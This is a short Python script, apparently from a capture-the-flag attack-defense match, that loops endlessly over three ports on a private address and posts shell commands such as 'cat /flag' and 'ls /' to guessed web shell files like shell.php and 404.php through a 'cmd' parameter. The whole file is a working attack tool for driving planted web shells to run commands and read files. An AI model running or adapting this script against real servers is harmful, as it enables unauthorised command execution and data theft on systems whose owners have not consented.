import time

import requests

shell_file = {'shell.php', '123.php', 'web.php', 'x.php', '404.php', 'index.php'}
payload = {'cat /flag', 'ls -al', 'flag', 'ls /', 'echo flag', 'cat /index.php'}

while True:
    for port in range(8081, 8084):
        for file in shell_file:
            url = 'http://192.168.110.34:' + str(port) + '/' + file
            # print(url)
            for command in payload:
                data = {
                    'cmd': command
                }
                try:
                    print('正在对 ' + url + ' 循环发包, 内容为 :' + command)
                    requests.post(url=url, data=data)
                    time.sleep(0.1)
                except Exception as e:
                    pass